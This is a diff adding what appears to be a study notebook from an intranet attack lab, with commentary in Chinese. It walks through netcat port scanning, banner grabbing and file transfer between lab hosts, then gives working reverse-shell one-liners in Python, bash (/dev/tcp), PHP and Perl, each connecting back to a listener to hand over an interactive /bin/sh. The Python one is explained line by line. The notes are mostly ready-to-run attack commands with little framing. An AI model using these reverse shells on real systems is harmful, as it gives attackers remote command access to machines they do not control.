@@ -1,0 +1,72 @@
+Border—Win7SP1
+扫描
+nc -v -z 192.168.123.101 20-1024 
+Banner抓取
+nc -nv 192.168.123.101 21 
+监听
+nc -l -p 9999
+测试语句http://192.168.123.123:9999/
+----------------------------------------------------------------------------
+文件传输
+Border
+echo "Intranet attack and defense" > 1.txt 
+ls -al | grep 1.txt
+nc -lp 333 >1.txt (执行2)
+cat 1.txt (执行3)
+VPS
+echo "I love study" > love.txt
+cat love.txt 
+nc -vn 2.2.2.123 333 < love.txt -q 1(执行1)
+
+----------------------------------------------------------------------------
+
+
+VPS
+nc -lvp 8888
+
+Python反弹Shell
+
+#属于Python2的脚本
+#socket用于创建套接字
+#subprocess用于进程创建
+#os用于操作系统
+python2 -c 'import socket,subprocess,os;
+#AF_INET表示是一个IPv4的套接字，SOCK_STREAM表示使用TCP流式socket
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+#套接字的实例化是IP地址2.2.2.10，端口8888
+s.connect(("2.2.2.10",8888));
+#os.dup2() 方法用于将一个文件描述符 fd 复制到另一个文件描述符fd
+#fileno()函数就是返回一个文件的文件描述符
+#文件描述符0表示标准输入stdin，1表示标准输出stdout，2表示标准错误输出stderr
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+#生成新的进程，连接到它们的 input/output/error 管道，并获取它们的返回（状态）码
+p=subprocess.call(["/bin/sh","-i"]);'
+#shell就会被subprocess调用，并用socket传输的数据替代stdin，stdout，stderr，使得在本地就能操作宿主机
+
+Border
+nc -lvp 7777
+CentOS7
+bash -i >& /dev/tcp/192.168.123.123/7777 0>&1
+
+VPS
+nc -lvp 8888
+ifconfig
+Border
+php -r '$sock=fsockopen("2.2.2.10",8888);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+
+VPS
+nc -lvp 9999
+ifconfig
+Border
+perl -e 'use Socket;
+$i="2.2.2.10";
+$p=9999;
+socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
+if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">$S");
+open(STDOUT,">&S");open(STDERR,">$S");
+exec("/bin/sh -i");};'
+
+
